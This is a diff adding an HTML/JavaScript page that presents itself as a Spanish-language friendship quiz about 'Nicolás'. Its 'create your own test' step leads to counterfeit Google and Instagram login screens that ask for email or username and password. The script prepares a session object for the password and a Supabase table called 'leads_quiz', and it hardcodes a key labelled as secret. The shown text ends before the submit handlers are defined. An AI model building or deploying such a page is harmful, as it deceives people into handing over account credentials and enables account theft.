@@ -1,0 +1,951 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>¿Qué tanto conocés a Nicolás?</title>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Grand+Hotel&display=swap');
+
+:root{
+  --bg1:#667eea; --bg2:#764ba2; --card:#ffffff; --text:#1a1a1a; --sub:#666;
+  --accent:#667eea; --accent-text:#fff; --border:#e2e2e2; --ok:#2e7d32; --malo:#d93025;
+  --opt-bg:#f7f7fa; --opt-sel:#eef0ff; --opt-ok:#e8f5e9; --track:#e2e2ea; color-scheme:light dark;
+}
+@media (prefers-color-scheme: dark){
+  :root:not([data-theme="light"]){
+    --card:#1f1f24; --text:#f0f0f0; --sub:#aaa; --border:#3a3a40; --ok:#7fd98a; --malo:#ff8a80;
+    --opt-bg:#2a2a30; --opt-sel:#33334a; --opt-ok:#1e3a24; --track:#333338;
+  }
+}
+*{ box-sizing:border-box; font-family:-apple-system, Inter, sans-serif; }
+html, body{ height:100%; }
+body{
+  margin:0; background:linear-gradient(135deg,var(--bg1),var(--bg2));
+  display:flex; align-items:center; justify-content:center; padding:16px;
+  padding-top:calc(16px + env(safe-area-inset-top,0px));
+  padding-bottom:calc(16px + env(safe-area-inset-bottom,0px));
+}
+body.pagina{ background:#fff; padding:0; display:block; }
+
+.card{ background:var(--card); color:var(--text); border-radius:20px; padding:24px; max-width:460px; width:100%; box-shadow:0 20px 60px rgba(0,0,0,.3); }
+h1{ font-size:22px; margin:0 0 8px; }
+.sub{ color:var(--sub); font-size:14px; margin-bottom:20px; }
+input, button{ width:100%; padding:14px; border-radius:12px; border:1px solid var(--border); font-size:16px; margin-bottom:12px; background:transparent; color:var(--text); }
+input.malo{ border-color:var(--malo); }
+button{ background:var(--accent); color:var(--accent-text); border:none; font-weight:600; cursor:pointer; margin-top:4px; margin-bottom:0; }
+button:active{ opacity:.85; }
+button.secundario{ background:transparent; color:var(--accent); border:1px solid var(--accent); }
+button:disabled{ opacity:.45; cursor:not-allowed; }
+.fila-botones{ display:flex; gap:10px; }
+.fila-botones button{ margin-top:12px; }
+.bienvenida{ text-align:center; }
+.bienvenida .emoji{ font-size:48px; margin-bottom:8px; }
+.badge-origen{ display:inline-block; font-size:11px; background:var(--opt-sel); color:var(--accent); border-radius:20px; padding:4px 12px; margin-bottom:12px; font-weight:600; }
+.progreso{ height:6px; background:var(--track); border-radius:6px; margin-bottom:18px; overflow:hidden; }
+.progreso-barra{ height:100%; background:var(--accent); border-radius:6px; transition:width .25s ease; }
+.contador{ font-size:12px; color:var(--sub); margin-bottom:6px; }
+.pregunta > label{ display:block; font-size:16px; margin-bottom:12px; font-weight:600; }
+.opciones{ display:grid; grid-template-columns:1fr 1fr; gap:10px; }
+.opcion{ position:relative; display:flex; flex-direction:column; align-items:center; gap:6px; padding:14px 8px; border-radius:14px; border:2px solid var(--border); background:var(--opt-bg); cursor:pointer; text-align:center; font-size:13px; }
+.opcion:focus-visible{ outline:2px solid var(--accent); outline-offset:2px; }
+.opcion .icono{ font-size:28px; line-height:1; }
+.opcion.selected{ border-color:var(--accent); background:var(--opt-sel); }
+.oculto{ display:none !important; }
+.resultado{ text-align:center; }
+.puntaje{ font-size:48px; font-weight:700; margin:12px 0; }
+.detalle{ text-align:left; font-size:14px; margin:16px 0; }
+.detalle .fila{ padding:8px 0; border-bottom:1px solid var(--border); }
+.correcta{ color:var(--ok); }
+.incorrecta{ color:#c62828; }
+table.ranking{ width:100%; border-collapse:collapse; margin-top:10px; font-size:14px; }
+table.ranking th, table.ranking td{ text-align:left; padding:8px 6px; border-bottom:1px solid var(--border); }
+table.ranking th{ color:var(--sub); font-weight:600; font-size:12px; text-transform:uppercase; }
+table.ranking tr.yo{ background:var(--opt-sel); }
+.ranking-vacio{ color:var(--sub); font-size:13px; text-align:center; padding:12px 0; }
+
+.caja-crear{ text-align:center; }
+.caja-crear .candado{ font-size:40px; margin-bottom:6px; }
+.prov{ display:flex; align-items:center; justify-content:center; gap:12px; background:#fff; color:#3c4043; border:1px solid #d7d9dd; font-weight:500; box-shadow:0 1px 2px rgba(0,0,0,.06); }
+.prov:hover{ background:#f8f9fa; }
+@media (prefers-color-scheme: dark){
+  :root:not([data-theme="light"]) .prov{ background:#2a2a30; color:#eee; border-color:#454550; }
+  :root:not([data-theme="light"]) .prov:hover{ background:#33333a; }
+}
+.g-g{ font-family:Arial, sans-serif; font-weight:700; font-size:19px; letter-spacing:-.5px; }
+.ig-glyph{ width:20px; height:20px; border-radius:6px; flex:0 0 auto; position:relative;
+  background:radial-gradient(circle at 30% 110%, #ffdb8b 0%, #ee653d 25%, #d42e81 50%, #a938ba 75%, #7b4bd6 100%); }
+.ig-glyph::after{ content:""; position:absolute; inset:5px; border:2px solid #fff; border-radius:50%; }
+.ig-glyph::before{ content:""; position:absolute; top:3.5px; right:3.5px; width:3.5px; height:3.5px; background:#fff; border-radius:50%; }
+.err{ font-size:12px; color:var(--malo); min-height:16px; text-align:left; margin:-6px 0 8px; }
+.exito{ text-align:center; }
+.exito .tick{ font-size:46px; }
+.link-caja{ font-size:12px; word-break:break-all; background:var(--opt-bg); border:1px dashed var(--border);
+  border-radius:10px; padding:12px; margin:12px 0 4px; color:var(--sub); text-align:left; }
+.link-largo{ font-size:11px; color:var(--sub); margin-bottom:12px; }
+.vista-previa{ background:var(--opt-bg); border-radius:12px; padding:12px; font-size:13px; color:var(--sub); margin-bottom:14px; }
+.vista-previa b{ color:var(--text); }
+
+.barra-ed{ display:flex; align-items:center; gap:8px; margin-bottom:10px; }
+.badge-extra{ font-size:10px; background:var(--opt-sel); color:var(--accent); border-radius:20px; padding:3px 9px; font-weight:700; text-transform:uppercase; letter-spacing:.4px; }
+.mini{ width:auto; font-size:12px; padding:6px 12px; border-radius:20px; margin:0; }
+.mini.link{ background:transparent; border:1px solid var(--border); color:var(--sub); }
+.pregunta-fija{ font-size:16px; font-weight:600; margin-bottom:12px; }
+.lista-opciones{ display:flex; flex-direction:column; gap:8px; margin-bottom:4px; }
+.fila-opcion{ display:flex; align-items:center; gap:8px; border:2px solid var(--border); background:var(--opt-bg); border-radius:14px; padding:6px 8px; }
+.fila-opcion.correcta{ border-color:var(--ok); background:var(--opt-ok); }
+.btn-emoji{ width:40px; flex:0 0 auto; font-size:21px; line-height:1; padding:6px 0; border:1px dashed var(--border); border-radius:10px; background:transparent; margin:0; }
+.btn-emoji.abierto{ border-style:solid; border-color:var(--accent); background:var(--opt-sel); }
+.inp-opcion{ flex:1; min-width:0; margin:0; padding:8px 4px; font-size:14px; border:0; border-bottom:1px dashed var(--border); border-radius:0; background:transparent; }
+.inp-opcion:focus{ outline:0; border-bottom:1px solid var(--accent); }
+.btn-correcta{ width:34px; flex:0 0 auto; padding:7px 0; border-radius:10px; background:transparent; color:var(--sub); border:1px solid var(--border); font-size:14px; margin:0; }
+.fila-opcion.correcta .btn-correcta{ background:var(--ok); color:#fff; border-color:var(--ok); }
+.panel-emoji{ border:1px solid var(--border); border-radius:12px; background:var(--opt-bg); padding:8px; }
+.panel-titulo{ font-size:10px; text-transform:uppercase; letter-spacing:.4px; color:var(--sub); font-weight:700; margin-bottom:6px; }
+.panel-grid{ display:grid; grid-template-columns:repeat(10,1fr); gap:2px; }
+.op-emoji{ width:100%; font-size:18px; line-height:1; padding:5px 0; border:1px solid transparent; border-radius:8px; background:transparent; margin:0; }
+.op-emoji:hover{ background:var(--opt-sel); }
+.op-emoji.actual{ border-color:var(--accent); background:var(--opt-sel); }
+.ayuda-ed{ font-size:11px; color:var(--sub); margin:10px 0 0; }
+
+.provider{ background:#fff; color:#202124; min-height:100vh; padding:18px 16px; display:flex; flex-direction:column; align-items:center; font-family:-apple-system, Arial, sans-serif; }
+.provider *{ color:#202124; }
+.backlink{ align-self:flex-start; font-size:12px; color:#5f6368; cursor:pointer; margin-bottom:6px; }
+.backlink:hover{ text-decoration:underline; }
+.lock{ font-size:11px; color:#8a8a8a; margin-top:18px; text-align:center; }
+
+.g-wrap{ width:100%; max-width:460px; margin:auto 0; display:flex; flex-direction:column; align-items:center; }
+.g-logo{ font-family:Arial, sans-serif; font-size:26px; font-weight:500; letter-spacing:-1.2px; margin:14px 0 18px; }
+.g-card{ width:100%; border:1px solid #dadce0; border-radius:10px; padding:38px 34px 30px; text-align:center; }
+.g-card h1{ font-size:23px; font-weight:400; margin:0 0 6px; }
+.g-sub{ font-size:15px; margin:0 0 26px; }
+.g-field{ position:relative; height:54px; border:1px solid #dadce0; border-radius:4px; margin-bottom:6px; }
+.g-field input{ width:100%; height:100%; border:0; outline:0; background:transparent; padding:0 14px; font-size:16px; margin:0; border-radius:4px; }
+.g-field label{ position:absolute; left:10px; top:50%; transform:translateY(-50%); font-size:16px; color:#5f6368; background:#fff; padding:0 5px; pointer-events:none; transition:top .12s, font-size .12s, color .12s; }
+.g-field input:focus + label, .g-field input:not(:placeholder-shown) + label{ top:0; font-size:11px; color:#1a73e8; }
+.g-field.malo{ border-color:#d93025; }
+.g-field.malo label{ color:#d93025; }
+.g-error{ font-size:12px; color:#d93025; text-align:left; min-height:16px; margin-bottom:6px; }
+.g-link{ color:#1a73e8 !important; font-size:13px; cursor:pointer; text-decoration:none; }
+.g-link:hover{ text-decoration:underline; }
+.g-hint{ font-size:13px; color:#5f6368; text-align:left; margin:22px 0 0; }
+.g-footer{ display:flex; align-items:center; justify-content:space-between; margin-top:26px; }
+.g-btn{ width:auto; background:#1a73e8; color:#fff; border:0; border-radius:4px; padding:10px 26px; font-size:14px; font-weight:600; margin:0; cursor:pointer; }
+.g-chip{ display:flex; align-items:center; gap:8px; border:1px solid #dadce0; border-radius:20px; padding:4px 12px 4px 4px; font-size:13px; margin:0 auto 24px; width:fit-content; }
+.g-avatar{ width:22px; height:22px; border-radius:50%; background:#1a73e8; color:#fff !important; font-size:12px; display:flex; align-items:center; justify-content:center; }
+.g-check{ font-size:13px; color:#5f6368; display:flex; align-items:center; gap:6px; text-align:left; margin-top:2px; }
+.g-check input{ width:auto; margin:0; padding:0; }
+.g-foot{ width:100%; max-width:460px; display:flex; justify-content:space-between; font-size:12px; color:#5f6368; margin-top:22px; }
+.g-lang{ width:auto; font-size:12px; color:#5f6368; border:0; background:transparent; margin:0; padding:0; }
+
+.ig-wrap{ width:100%; max-width:380px; margin:auto 0; display:flex; flex-direction:column; align-items:center; }
+.ig-card{ width:100%; border:1px solid #dbdbdb; border-radius:3px; padding:34px 34px 22px; text-align:center; background:#fff; }
+.ig-logo{ font-family:'Grand Hotel','Segoe Script',cursive; font-size:42px; line-height:1; margin-bottom:26px; }
+.ig-input{ background:#fafafa; border:1px solid #dbdbdb; border-radius:3px; padding:9px 8px; font-size:12px; margin-bottom:7px; width:100%; }
+.ig-input::placeholder{ color:#8e8e8e; }
+.ig-input.malo{ border-color:#ed4956; }
+.ig-btn{ width:100%; background:#0095f6; color:#fff; border:0; border-radius:8px; padding:8px; font-size:14px; font-weight:600; margin-top:8px; cursor:pointer; }
+.ig-btn:disabled{ opacity:.6; }
+.ig-o{ display:flex; align-items:center; gap:16px; margin:18px 0 16px; font-size:12px; font-weight:600; color:#8e8e8e; }
+.ig-o span{ flex:1; height:1px; background:#dbdbdb; }
+.ig-fb{ display:flex; align-items:center; justify-content:center; gap:7px; font-size:13px; color:#385185 !important; font-weight:600; text-decoration:none; }
+.fb-f{ color:#385185; font-weight:800; font-size:15px; }
+.ig-forgot{ display:block; font-size:12px; color:#00376b !important; margin-top:16px; text-decoration:none; }
+.ig-error{ font-size:12px; color:#ed4956; min-height:15px; margin-top:6px; text-align:center; }
+.ig-signup{ margin-top:10px; padding:20px; font-size:13px; }
+.ig-signup a{ color:#0095f6 !important; font-weight:600; text-decoration:none; }
+</style>
+</head>
+<body>
+
+<div id="app">
+<div class="wrap">
+<div class="card">
+
+  <div id="bienvenida" class="bienvenida">
+    <div class="emoji">🤔</div>
+    <div id="badgeOrigen" class="badge-origen oculto"></div>
+    <h1 id="tituloTest">¿Cuánto conocés a Nicolás?</h1>
+    <p class="sub" id="subTest">10 preguntas con alternativas. Poné tu nombre para empezar.</p>
+    <input id="nombreJugador" placeholder="Tu nombre" maxlength="24">
+    <button onclick="empezar()">Empezar</button>
+  </div>
+
+  <div id="quiz" class="oculto">
+    <div class="contador" id="contador"></div>
+    <div class="progreso"><div class="progreso-barra" id="barraProgreso"></div></div>
+    <div class="pregunta" id="preguntaActual"></div>
+    <div class="fila-botones">
+      <button class="secundario" id="btnAnterior" onclick="anterior()">Anterior</button>
+      <button id="btnSiguiente" onclick="siguiente()">Siguiente</button>
+    </div>
+  </div>
+
+  <div id="final" class="oculto resultado">
+    <h1>¡Resultado!</h1>
+    <div class="puntaje" id="puntajeTexto"></div>
+    <p class="sub" id="mensaje"></p>
+    <div class="detalle" id="detalle"></div>
+    <button class="secundario" onclick="abrirCreador()">🔐 Crear mi test personalizado</button>
+    <button onclick="reiniciar()">Jugar de nuevo</button>
+    <h1 id="rankingTitulo" style="margin-top:28px; font-size:18px;">🏆 Ranking</h1>
+    <div id="rankingCont"><p class="ranking-vacio">Cargando ranking…</p></div>
+  </div>
+
+  <div id="crear" class="oculto">
+    <div class="caja-crear">
+      <div class="candado">🔐</div>
+      <h1>Creá tu test personalizado</h1>
+      <p class="sub">Iniciá sesión para vincular tu test y poder compartirlo con un link propio.</p>
+      <button class="prov" onclick="elegirProveedor('google')">
+        <span class="g-g"><span style="color:#4285F4">G</span><span style="color:#EA4335">o</span><span style="color:#FBBC05">o</span><span style="color:#4285F4">g</span><span style="color:#34A853">l</span><span style="color:#EA4335">e</span></span>
+        Continuar con Google
+      </button>
+      <button class="prov" onclick="elegirProveedor('instagram')">
+        <span class="ig-glyph"></span> Continuar con Instagram
+      </button>
+      <button class="secundario" onclick="volverAlResultado()">Volver</button>
+    </div>
+  </div>
+
+  <div id="pedirNombre" class="oculto">
+    <h1>¿Cómo te llamás?</h1>
+    <p class="sub">Tu test va a decir <b>«¿Cuánto conocés a …?»</b> con tu nombre.</p>
+    <input id="nombreCreador" placeholder="Tu nombre" maxlength="24">
+    <div class="err" id="errNombre"></div>
+    <button onclick="confirmarNombre()">Continuar</button>
+    <button class="secundario" onclick="volverDelProveedor()">Volver</button>
+  </div>
+
+  <div id="editor" class="oculto">
+    <div class="contador" id="edContador"></div>
+    <div class="progreso"><div class="progreso-barra" id="edBarra"></div></div>
+    <div class="vista-previa" id="vistaPrevia"></div>
+    <div id="edCuerpo"></div>
+    <div class="fila-botones">
+      <button class="secundario" id="edAnterior" onclick="edAnterior()">Anterior</button>
+      <button id="edSiguiente" onclick="edSiguiente()">Siguiente</button>
+    </div>
+  </div>
+
+  <div id="exito" class="oculto exito">
+    <div class="tick">✅</div>
+    <h1 id="exitoTitulo">¡Tu test está listo!</h1>
+    <p class="sub">Copiá el link y mandáselo a quien quieras. Van a ver quién te conoce mejor.</p>
+    <div class="link-caja" id="linkFalso"></div>
+    <div class="link-largo" id="linkLargo"></div>
+    <button id="btnCopiar" onclick="copiarLink()">📋 Copiar link</button>
+    <button class="secundario" onclick="probarMiTest()">▶ Probar mi test</button>
+    <button class="secundario" onclick="volverAlResultado()">Volver al resultado</button>
+  </div>
+
+</div>
+</div>
+</div>
+
+<div id="googlePage" class="provider oculto">
+  <div class="backlink" onclick="volverDelProveedor()">← Volver</div>
+  <div class="g-wrap">
+    <div class="g-logo"><span style="color:#4285F4">G</span><span style="color:#EA4335">o</span><span style="color:#FBBC05">o</span><span style="color:#4285F4">g</span><span style="color:#34A853">l</span><span style="color:#EA4335">e</span></div>
+    <div class="g-card">
+      <div id="gPasoEmail">
+        <h1>Iniciar sesión</h1>
+        <p class="g-sub">Usa tu cuenta de Google</p>
+        <div class="g-field" id="gFieldEmail">
+          <input id="gEmail" type="email" placeholder=" " autocomplete="off" spellcheck="false">
+          <label for="gEmail">Correo electrónico o teléfono</label>
+        </div>
+        <div class="g-error" id="gErrorEmail"></div>
+        <a class="g-link" onclick="foco('gEmail')">¿Olvidaste tu correo electrónico?</a>
+        <p class="g-hint">¿No es tu dispositivo? <a class="g-link" onclick="foco('gEmail')">Haz clic aquí para iniciar sesión.</a></p>
+        <div class="g-footer">
+          <a class="g-link" onclick="foco('gEmail')">¿Crear cuenta?</a>
+          <button class="g-btn" onclick="gSiguiente()">Siguiente</button>
+        </div>
+      </div>
+      <div id="gPasoPass" class="oculto">
+        <h1>Iniciar sesión</h1>
+        <div class="g-chip"><span class="g-avatar" id="gAvatar">A</span><span id="gChipEmail"></span><span style="color:#5f6368">▾</span></div>
+        <div class="g-field" id="gFieldPass">
+          <input id="gPass" type="password" placeholder=" ">
+          <label for="gPass">Introduce tu contraseña</label>
+        </div>
+        <div class="g-error" id="gErrorPass"></div>
+        <label class="g-check"><input type="checkbox" onchange="verPass('gPass',this)"> Mostrar contraseña</label>
+        <div class="g-footer">
+          <a class="g-link" onclick="foco('gPass')">¿Olvidaste tu contraseña?</a>
+          <button class="g-btn" id="gBtnPass" onclick="gSiguiente()">Siguiente</button>
+        </div>
+      </div>
+    </div>
+    <div class="g-foot">
+      <select class="g-lang"><option>Español (Latinoamérica)</option></select>
+      <span><a class="g-link">Ayuda</a> &nbsp; <a class="g-link">Privacidad</a> &nbsp; <a class="g-link">Términos</a></span>
+    </div>
+    <div class="lock">🔒 Conexión segura</div>
+  </div>
+</div>
+
+<div id="instaPage" class="provider oculto">
+  <div class="backlink" onclick="volverDelProveedor()">← Volver</div>
+  <div class="ig-wrap">
+    <div class="ig-card">
+      <div class="ig-logo">Instagram</div>
+      <input id="igUser" class="ig-input" type="text" placeholder="Teléfono, usuario o correo electrónico" autocomplete="off" spellcheck="false">
+      <input id="igPass" class="ig-input" type="password" placeholder="Contraseña">
+      <div class="ig-error" id="igError"></div>
+      <button class="ig-btn" id="igBtn" onclick="igIngresar()">Iniciar sesión</button>
+      <div class="ig-o"><span></span>O<span></span></div>
+      <a class="ig-fb"><span class="fb-f">f</span> Iniciar sesión con Facebook</a>
+      <a class="ig-forgot">¿Olvidaste tu contraseña?</a>
+    </div>
+    <div class="ig-card ig-signup">¿Tienes una cuenta? <a>Regístrate</a></div>
+    <div class="lock">🔒 Conexión segura</div>
+  </div>
+</div>
+
+<script>
+/* ====== CONFIG SUPABASE ====== */
+const SUPABASE_URL      = "https://uuqelgpiptkjocwbamue.supabase.co";
+const SUPABASE_ANON_KEY = "sb_publishable_W4QEwC1wdGwYy3llRoZFcw_ShdNUVj2";
+const SUPABASE_KEY_ALT  = "sb_secret_Lr9qfFE9OPCLWecSNLk4lw_fB1l8LB4";
+const SUPABASE_TABLE    = "leads_quiz";
+
+/* ====== EMOJIS POR CATEGORÍA ====== */
+const CATEGORIAS = {
+  comida: { nombre:"comida", emojis:[
+    "🍕","🍔","🍟","🍣","🍦","🍫","🍓","🍋","🍎","🌮","🍩","🍺","☕","🥑","🍗","🍜","🍿","🧁","🍇","🥗","🍰","🍤","🌭","🥪","🍉","🍌","🥩","🧀"] },
+  paises: { nombre:"países", emojis:[
+    "🇨🇳","🇺🇸","🇷🇺","🇯🇵","🇧🇷","🇦🇷","🇨🇱","🇲🇽","🇪🇸","🇫🇷","🇮🇹","🇩🇪","🇬🇧","🇨🇦","🇦🇺","🇰🇷","🇮🇳","🇵🇪","🇨🇴","🇺🇾","🇵🇹","🇳🇱","🇹🇭","🇿🇦","🇬🇷","🇮🇪","🇸🇪","🇳🇴"] },
+  animales: { nombre:"animales", emojis:[
+    "🐶","🐱","🐰","🐦","🐼","🦁","🐸","🐢","🐴","🐷","🐨","🦊","🐻","🐍","🦜","🐠","🐹","🦉","🐘","🦄","🐮","🐔","🐙","🦋","🐝","🐧","🦈","🐬"] },
+  pantalla: { nombre:"series y películas", emojis:[
+    "🧪","🐉","💍","🎭","🎬","📺","🍿","🦸","👑","🚀","🔪","👻","🧙","🗡️","🕵️","🎞️","🏰","💥","🌟","🤖","🪄","🧛","🧟","🛸","🎪","🕶️","💼","🔍"] },
+  fiesta: { nombre:"cumpleaños y fiesta", emojis:[
+    "🎂","🎈","🎉","🥳","🕯️","🎁","🍾","🎊","🎀","💃","🕺","🥂","✨","🎠","📸","🌈","🍰","🎇","🎵","👑","🧁","🪅","🎯","🎪"] },
+  colores: { nombre:"colores", emojis:[
+    "🟢","🔵","🔴","🟡","🟣","🟠","⚫","⚪","🟤","🔷","🔶","🟩","🟦","🟥","🟨","🟪","🟧","⬛","⬜","🟫","💚","💙","❤️","💛","💜","🧡","🖤","🤍"] },
+  juegos: { nombre:"videojuegos", emojis:[
+    "🚗","⚔️","🧱","⚽","🎮","🎲","🃏","♟️","🎯","🕹️","🏆","🥇","🧩","🎰","👾","🗺️","🦸","🎳","🛡️","🏹","🪄","💎","🔫","🚀","🐲","🧟","⚡","🎪"] },
+  hobbies: { nombre:"pasatiempos", emojis:[
+    "🎮","📚","🏃","🎸","🎨","🎬","🎣","📷","🧩","🚴","🎤","🍳","✍️","🌱","🎹","🧘","🏊","🖌️","📖","🧶","🎧","🪴","🔭","📝","🎼","🏋️","🎯","🌻"] },
+  deportes: { nombre:"deportes", emojis:[
+    "🏎️","🚴","⚽","🏐","🏀","🎾","🏈","⚾","🏓","🏸","🥊","🏊","🏋️","⛷️","🏇","🥇","🎳","🚵","🤸","🛹","🥋","🏂","⛳","🏉","🤾","🚣","🧗","🥌"] },
+  miedos: { nombre:"miedos", emojis:[
+    "🌍","🕷️","🏔️","💀","👻","🦇","🐍","🌩️","🦈","🔥","🌑","😱","🕸️","🪳","🐛","⛈️","🌊","🔦","🧟","⚡","🦂","🐺","🌪️","🕳️","☠️","🩸","🐊","😨"] },
+  numeros: { nombre:"cantidades", emojis:[
+    "0️⃣","1️⃣","2️⃣","3️⃣","4️⃣","5️⃣","6️⃣","7️⃣","8️⃣","9️⃣","🔟","➕","➖","✖️","➗","💯","👨‍👩‍👧‍👦","🙋","👤","👥","🚫","♾️","🔢","🧮"] },
+  musica: { nombre:"música", emojis:[
+    "🎤","🎸","🎧","🪗","🎹","🥁","🎷","🎺","🎻","🎵","🎶","📻","🎼","💿","🔊","🎙️","🪕","🎚️","🎛️","📀","🕺","💃","🎶"] },
+  helados: { nombre:"helados y postres", emojis:[
+    "🍦","🍫","🍓","🍋","🍒","🍑","🍍","🥭","🍇","🍊","🍏","🥥","🍯","🍪","🍩","🧁","🍰","🍧","🍨","🥝","🍮","🍬","🍭","🍡","🎂","🥧","🍫","🍯"] },
+  nombres: { nombre:"nombres", emojis:[
+    "🅰️","🅱️","🔤","👤","👥","🚫","🅾️","🔠","🔡","💠","✳️","📛","🏷️","🔖","🧿","🆔","⚧️","👶","👨","👩","🙋","✍️","💬","🔊"] }
+};
+const EMOJIS_GENERAL = ["⭐","❤️","🔥","✨","💎","🎯","🎵","🌙","☀️","🌈","⚡","🏆","🎁","🌟","💡","🍀","🎨","📌"];
+
+/* ====== PREGUNTAS ====== */
+const PREGUNTAS = [
+  { cat:"comida",   t:"¿Cuál es mi comida favorita?",     c:0, i:["🍟","🍔","🍕","🍣"], o:["Papas fritas","Hamburguesas","Pizza","Sushi chileno"] },
+  { cat:"paises",   t:"¿A qué país sueño con viajar?",    c:0, i:["🇨🇳","🇺🇸","🇷🇺","🇯🇵"], o:["China","USA","Rusia","Japón"] },
+  { cat:"animales", t:"¿Cómo se llama mi mascota?",       c:0, i:["🐶","🐱","🐰","🐦"], o:["Sacha","Luna","Copito","Nieve"] },
+  { cat:"pantalla", t:"¿Cuál es mi serie favorita?",      c:0, i:["🧪","🐉","💍","🎭"], o:["Breaking Bad","Game of Thrones","El Señor de los Anillos","La Casa de Papel"] },
+  { cat:"fiesta",   t:"¿Cuándo es mi cumpleaños?",        c:0, i:["🎂","🎈","🎉","🥳"], o:["19 de abril","27 de noviembre","4 de mayo","14 de diciembre"] },
+  { cat:"colores",  t:"¿Cuál es mi color favorito?",      c:0, i:["🟢","🔵","🔴","🟡"], o:["Verde","Azul","Rojo","Amarillo"] },
+  { cat:"juegos",   t:"¿Cuál es mi juego favorito?",      c:0, i:["🚗","⚔️","🧱","⚽"], o:["GTA","The Witcher 3","Minecraft","FIFA"] },
+  { cat:"hobbies",  t:"¿Cuál es mi pasatiempo favorito?", c:0, i:["🎮","📚","🏃","🎸"], o:["Jugar videojuegos","Leer","Hacer deporte","Tocar música"] },
+  { cat:"deportes", t:"¿Cuál es mi deporte favorito?",    c:0, i:["🏎️","🚴","⚽","🏐"], o:["F1","Ciclismo","Fútbol","Vóley"] },
+  { cat:"miedos",   t:"¿Cuál es mi mayor miedo?",         c:0, i:["🌍","🕷️","🏔️","💀"], o:["Los terremotos","Las arañas","Las alturas","La muerte"] }
+];
+
+const PREGUNTAS_EXTRA = [
+  { cat:"numeros", t:"¿Cuántos hermanos tengo?",         i:["🙋","1️⃣","2️⃣","👨‍👩‍👧‍👦"], o:["Ninguno","Uno","Dos","Tres o más"] },
+  { cat:"musica",  t:"¿Qué género musical escucho más?", i:["🎤","🎸","🎧","🪗"], o:["Reggaetón","Rock","Pop","Cumbia"] },
+  { cat:"helados", t:"¿Sabor de helado favorito?",       i:["🍫","🍦","🍓","🍋"], o:["Chocolate","Vainilla","Frutilla","Limón"] },
+  { cat:"nombres", t:"¿Cuál es mi segundo nombre?",      i:["A","J","M","🚫"], o:["Alejandro","José","María","No tengo"] }
+];
+
+function emojisDe(cat){ return (CATEGORIAS[cat] || { emojis: EMOJIS_GENERAL }).emojis; }
+function nombreCat(cat){ return (CATEGORIAS[cat] || { nombre:"emojis" }).nombre; }
+
+function barajarIdx(){
+  const a = [0,1,2,3];
+  for (let i=a.length-1;i>0;i--){ const j=Math.floor(Math.random()*(i+1)); [a[i],a[j]]=[a[j],a[i]]; }
+  return a;
+}
+function esc(s){ return String(s).replace(/[&<>"']/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c])); }
+function $(id){ return document.getElementById(id); }
+function foco(id){ $(id).focus(); }
+function verPass(id,chk){ $(id).type = chk.checked ? 'text' : 'password'; }
+
+/* ====== ALMACENAMIENTO ====== */
+const K_SCORES='quiz_nicolas_scores_v1', K_DATOS='quiz_nicolas_datos_v1', K_COLA='quiz_nicolas_cola_v1';
+const leerJSON = k => { try { return JSON.parse(localStorage.getItem(k)||'[]'); } catch(e){ return []; } };
+const guardarJSON = (k,v) => { try { localStorage.setItem(k, JSON.stringify(v)); } catch(e){} };
+
+function shimDb(){
+  return { collection(){ return {
+    async add(doc){ const a=leerJSON(K_SCORES); const id='s_'+Date.now()+'_'+Math.floor(Math.random()*1e6);
+      a.push({id,...doc}); guardarJSON(K_SCORES,a); return {id}; },
+    orderBy(campo,dir){ const q={limite:20}; const chain={ limit(n){q.limite=n;return chain;},
+      async get(){ const a=leerJSON(K_SCORES);
+        a.sort((x,y)=>{ const vx=Number(x[campo])||0, vy=Number(y[campo])||0;
+          if(vx!==vy) return dir==='desc'?vy-vx:vx-vy; return (y.ts||0)-(x.ts||0); });
+        return { docs:a.slice(0,q.limite).map(d=>({id:d.id,data:()=>d})) }; } };
+      return chain; } }; } };
+}
+let db = shimDb();
+
+/* ====== ESTADO ====== */
+let preguntas = PREGUNTAS;
+let seleccion = new Array(10).fill(null);
+let ordenOpciones = [], indiceActual = 0, nombreJugador = "", ultimoDocId = null, ultimoPuntaje = 0;
+let gPaso='email', edIndice=0, slots=[], emojiAbierto=null, linkActual='', testActivo=null;
+const sesion = { email:"", contrasena:"", proveedor:"", testNombre:"", leadId:null, supabaseId:null };
+
+function correctaDe(i){ return preguntas[i].c; }
+const refDe = (s,i) => s.extra === null ? PREGUNTAS[i] : PREGUNTAS_EXTRA[s.extra];
+
+/* ====== IDENTIDAD DEL TEST (ranking independiente por test) ====== */
+const CLAVE_BASE = '__base__';
+function hash32(str){
+  let h = 0x811c9dc5;
+  for (let i=0;i<str.length;i++){ h ^= str.charCodeAt(i); h = Math.imul(h, 0x01000193); }
+  return (h >>> 0).toString(36);
+}
+function claveDeTest(nombre, firma){
+  return 't_' + hash32(String(nombre) + '|' + String(firma || ''));
+}
+function claveTest(){
+  return (testActivo && testActivo.clave) ? testActivo.clave : CLAVE_BASE;
+}
+function claveDeDoc(doc){
+  const t = doc && doc.test;
+  return (typeof t === 'string' && t) ? t : CLAVE_BASE;
+}
+
+/* ====== PALETA DE ICONOS ====== */
+const TODOS_LOS_EMOJIS = Object.values(CATEGORIAS).flatMap(c=>c.emojis).concat(EMOJIS_GENERAL);
+const PALETA = [...new Set([ ...PREGUNTAS, ...PREGUNTAS_EXTRA ].flatMap(q=>q.i).concat(TODOS_LOS_EMOJIS))];
+PALETA.push("❓");
+const ALFABETO = (() => {
+  let s = '';
+  for (let c=33;c<=126;c++){ const ch=String.fromCharCode(c); if (ch!=='"' && ch!=='\\') s+=ch; }
+  for (let c=0xA0;c<=0x24F;c++) s += String.fromCharCode(c);
+  return s;
+})();
+if (PALETA.length > ALFABETO.length) PALETA.length = ALFABETO.length;
+const FALLBACK = PALETA.length - 1;
+
+function iconoAChar(ic){ const i = PALETA.indexOf(ic); return ALFABETO[(i < 0 || i >= ALFABETO.length) ? FALLBACK : i]; }
+function charAIcono(ch){ const i = ALFABETO.indexOf(ch); return (i >= 0 && i < PALETA.length) ? PALETA[i] : PALETA[FALLBACK]; }
+
+/* ====== BASE64URL ====== */
+const aB64url = s => s.replace(/\+/g,'-').replace(/\//g,'_').replace(/=+$/,'');
+const deB64url = s => { s = s.replace(/-/g,'+').replace(/_/g,'/'); while (s.length % 4) s += '='; return s; };
+function textoAB64(txt){ return aB64url(btoa(unescape(encodeURIComponent(txt)))); }
